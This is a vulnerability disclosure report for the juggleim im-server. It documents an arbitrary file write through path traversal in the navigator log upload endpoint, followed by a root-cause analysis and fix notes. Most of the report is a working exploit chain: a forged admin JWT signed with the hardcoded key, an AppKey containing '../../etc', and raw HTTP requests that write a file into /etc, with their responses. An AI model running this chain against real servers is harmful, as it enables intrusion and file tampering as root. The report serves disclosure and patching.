### Vulnerability details

**Official website / Product:** https://www.juggle.im/ / https://github.com/juggleim/im-server

**Repository:** juggleim/im-server (stars at selection: 3535)

**Vulnerability type:** file_upload (path traversal → arbitrary file write)

**Vulnerability versions:** current master / release lineage through v1.8.16 (audited commit `cb7297860c9e3064956274d75775cbd2a2f4c060`, Docker image `juggleim/im-server:r10a2` built from that tree; console module imserver-console v1.0.10)

**Vulnerability URL / Parameter:** `POST /navigator/upload-log` multipart field `log`; destination path concatenates authenticated `x-appkey` (AppKey) unsanitized: `./client-logs/` + AppKey + `-` + UUID + Ext(filename)

**Complex:** yes

### Verification procedure

1. Bring up the lab (original `labs/juggleim-r10a2/docker-compose.yml` is no longer in-tree; rebuild from the audited commit with upstream `docker-compose.yml`):

```bash
git clone https://github.com/juggleim/im-server.git
cd im-server
git checkout cb7297860c9e3064956274d75775cbd2a2f4c060
ADMIN_HOST_PORT=19002 API_HOST_PORT=19101 NAV_HOST_PORT=19102 \
  WS_HOST_PORT=19103 MYSQL_HOST_PORT=19112 \
  docker compose up -d --build
```

Images: `mysql:8.0` + `juggleim/im-server:local` built from that commit (lab previously tagged it `juggleim/im-server:r10a2`). Host ports: admin **19002**→8090, API **19101**→9001, navigator **19102**→9002, WS **19103**→9003, MySQL **19112**→3306. Official compose container names: `juggleim-server` / `juggleim-mysql` (lab project dir previously yielded `juggleim-r10a2-server`). Process CWD inside the container is `/opt`. Default MySQL root password `juggleim`; admin console default `admin/123456`.
2. Default deploy leaves `AdminSecret` empty, so admin JWT is signed with hardcoded key `jug9le1m` (`imserver-console/apis/validate.go` `getJwtKey`). Forge an HS256 admin JWT (claims: `Account=admin`, `iss=aabbcc`, `sub=user token`, reasonable `iat`/`exp`). Default `admin/123456` login also works (CVE-2026-111329) but is not required for this chain. Lab-forged token:
   `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBY2NvdW50IjoiYWRtaW4iLCJpc3MiOiJhYWJiY2MiLCJzdWIiOiJ1c2VyIHRva2VuIiwiZXhwIjoxNzk0NDA0Mjg0LCJpYXQiOjE3OTM1NDAyODR9.XHGANNMeVjCL4RJN7nKpFZQur0v6YPQjtoNzhvp8nzY`
3. `POST http://127.0.0.1:19002/admingateway/apps/create` with that JWT in `Authorization` and body `"app_key":"../../etc/r10poc"`, `"app_secret":"1234567890abcdef"` (16-char secret).
4. `POST http://127.0.0.1:19101/apigateway/users/register` with API auth headers `appkey` / `nonce` / `timestamp` (ms) / `signature`, where **`signature = SHA1(appsecret + nonce + timestamp)`** (fixed order). Receive the IM `token`.
5. `POST http://127.0.0.1:19102/navigator/upload-log` with headers `x-appkey: ../../etc/r10poc`, `x-token: <token>`, multipart `log` body `R10A2-AFW-ETC-PROOF` and `filename=payload` (no extension).
6. Inside the app container, confirm a new file under `/etc/` (outside `./client-logs/`) whose contents are the uploaded payload:

```bash
docker exec juggleim-server sh -c 'ls -la /etc/r10poc-* ; cat /etc/r10poc-* ; ls -la /opt/client-logs/'
```

Expected output (lab container name was previously `juggleim-r10a2-server`):

```
-rw-r--r--    1 root     root            20 Nov  1 13:38 /etc/r10poc-37Q-lVzikCqbzzDf6ZSNWq
----
R10A2-AFW-ETC-PROOF
----
total 16
drwxr-x---    2 root     root          4096 Nov  1 13:36 .
drwxr-x---    1 root     root          4096 Nov  1 13:36 ..
-rw-r--r--    1 root     root            13 Nov  1 13:36 normalappkey1234-4IdG1jyckVP9IBILLwfBgN.txt
```

### Complete vulnerability PoC

**Prerequisite 1 — create traversal AppKey (Docker-verified):**

```http
POST /admingateway/apps/create HTTP/1.1
Host: 127.0.0.1:19002
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBY2NvdW50IjoiYWRtaW4iLCJpc3MiOiJhYWJiY2MiLCJzdWIiOiJ1c2VyIHRva2VuIiwiZXhwIjoxNzk0NDA0Mjg0LCJpYXQiOjE3OTM1NDAyODR9.XHGANNMeVjCL4RJN7nKpFZQur0v6YPQjtoNzhvp8nzY
Content-Type: application/json
Content-Length: 87
Connection: close

{"app_name": "r10poc", "app_key": "../../etc/r10poc", "app_secret": "1234567890abcdef"}
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type, Content-Length, Authorization, X-Requested-With, X-CSRF-Token, X-Token, X-Appid
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
Access-Control-Expose-Headers: Content-Length, Content-Type, X-Token, X-Appid
Access-Control-Max-Age: 86400
Content-Type: application/json; charset=utf-8
Request-Id: admin_h1QQQCbunlt
Date: Sun, 01 Nov 2026 13:38:04 GMT
Content-Length: 334
Connection: close

{"code":0,"msg":"success","data":{"app_type":0,"app_name":"r10poc","created_time":0,"updated_time":0,"app_key":"../../etc/r10poc","app_secret":"1234567890abcdef","app_status":0,"alias":"100005","ws_url":"","api_url":"","app_url":"","max_user_count":0,"cur_user_count":0,"restricted_fields":null,"config_fields":null,"expired_time":0}}
```

**Prerequisite 2 — register user for navigator token (`signature=SHA1("1234567890abcdef"+"2400"+"1793540284759")`):**

```http
POST /apigateway/users/register HTTP/1.1
Host: 127.0.0.1:19101
Content-Type: application/json
appkey: ../../etc/r10poc
nonce: 2400
timestamp: 1793540284759
signature: 79215a5b2ba49510dd00a8845bc2eabe7451d9ac
Content-Length: 39
Connection: close

{"user_id": "pocu", "nickname": "pocu"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Request-Id: api_bQYQrP8njqT
Date: Sun, 01 Nov 2026 13:38:04 GMT
Content-Length: 111
Connection: close

{"code":0,"msg":"success","data":{"user_id":"pocu","token":"ChAuLi8uLi9ldGMvcjEwcG9jGhAOuchpd26ZekFI3917T8Y2"}}
```

**Trigger — path-traversal arbitrary file write (Docker-verified):**

```http
POST /navigator/upload-log HTTP/1.1
Host: 127.0.0.1:19102
x-appkey: ../../etc/r10poc
x-token: ChAuLi8uLi9ldGMvcjEwcG9jGhAOuchpd26ZekFI3917T8Y2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr10a2poc
Content-Length: 287
Connection: close

------WebKitFormBoundaryr10a2poc
Content-Disposition: form-data; name="log"; filename="payload"
Content-Type: application/octet-stream

R10A2-AFW-ETC-PROOF

------WebKitFormBoundaryr10a2poc
Content-Disposition: form-data; name="msg_id"

poc1
------WebKitFormBoundaryr10a2poc--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type,AccessToken,X-CSRF-Token, Authorization, x-token, x-appkey, x-platform
Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PATCH, PUT
Access-Control-Allow-Origin: *
Access-Control-Expose-Headers: Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Content-Type, X-Token, X-Appid
Content-Type: application/json; charset=utf-8
Date: Sun, 01 Nov 2026 13:38:04 GMT
Content-Length: 38
Connection: close

{"code":0,"msg":"success","data":null}
```

Verification result notes:

HTTP 200 `{"code":0,"msg":"success","data":null}`. Container proof:

```
-rw-r--r--    1 root     root            20 Nov  1 13:38 /etc/r10poc-37Q-lVzikCqbzzDf6ZSNWq
----
R10A2-AFW-ETC-PROOF
----
total 16
drwxr-x---    2 root     root          4096 Nov  1 13:36 .
drwxr-x---    1 root     root          4096 Nov  1 13:36 ..
-rw-r--r--    1 root     root            13 Nov  1 13:36 normalappkey1234-4IdG1jyckVP9IBILLwfBgN.txt
```

The written path resolves from CWD `/opt` as `./client-logs/../../etc/r10poc-<uuid>` → `/etc/r10poc-<uuid>`. The same AppKey pattern also wrote under `/tmp/` and `/opt/` in earlier probes. Intended directory `/opt/client-logs/` only contains the control upload for a non-traversal AppKey.

### Vulnerability analysis

`UploadClientLog` builds the on-disk path by string-concatenating the request AppKey (taken from `x-appkey` after token validation sets `CtxKey_AppKey`) between a fixed prefix `./client-logs/` and a server-generated UUID + client filename extension. There is no `filepath.Clean` confinement check, no rejection of `..`, and no allowlist on AppKey charset at create time (`CreateApp` accepts a caller-supplied `app_key` up to DB column width).

Gin `SaveUploadedFile` calls `os.MkdirAll` on the parent of the destination and then creates the file, so traversal AppKeys create/write outside the upload directory as the process user (root in the official Docker image).

Authenticated preconditions: a valid navigator token for that AppKey (obtained via API register with AppSecret) plus the ability to choose/create the AppKey. On default Docker, AppKey creation is reachable by forging the admin JWT with the hardcoded signing key when `AdminSecret` is unset.

Trigger / sink source (full path and line numbers):

```go
# File: services/navigator/apis/logupload.go
# Lines: 13-49
func UploadClientLog(ctx *gin.Context) {
	file, err := ctx.FormFile("log")
	if err != nil || file == nil {
		tools.ErrorHttpResp(ctx, errs.IMErrorCode_OTHER_CLIENT_LOG_PARAM_ILLEGAL)
		return
	}

	src, err := file.Open()
	if err != nil {
		tools.ErrorHttpResp(ctx, errs.IMErrorCode_OTHER_CLIENT_LOG_PARAM_ILLEGAL)
		return
	}
	defer src.Close()
	data := make([]byte, file.Size)
	_, err = src.Read(data)

	if err != nil {
		tools.ErrorHttpResp(ctx, errs.IMErrorCode_OTHER_CLIENT_LOG_PARAM_ILLEGAL)
		return
	}

	msgId := ctx.PostForm("msg_id")
	if msgId != "" && len(data) > 0 {
		dao := dbs.ClientLogDao{}
		dao.Update(ctx.GetString(CtxKey_AppKey), msgId, data, dbs.ClientLogState_Uploaded)
	}

	fileExt := filepath.Ext(file.Filename)
	filePath := "./client-logs/" + ctx.GetString(CtxKey_AppKey) + "-" + utils.GenerateUUIDShortString() + fileExt

	err = ctx.SaveUploadedFile(file, filePath)
	if err != nil {
		tools.ErrorHttpResp(ctx, errs.IMErrorCode_API_PARAM_REQUIRED)
		return
	}
	tools.SuccessHttpResp(ctx, nil)
}
```

### Fix notes

- Sanitize/reject AppKeys that contain path separators or `..` at create time and at upload time.
- Build the destination with `filepath.Join` then require `strings.HasPrefix(filepath.Clean(absDst), filepath.Clean(absUploadRoot)+string(os.PathSeparator))` (or equivalent) before write.
- Prefer a server-generated object name that does not embed AppKey path segments; store AppKey only as metadata.
- Set a non-default `AdminSecret` so JWT signing does not fall back to `jug9le1m`.
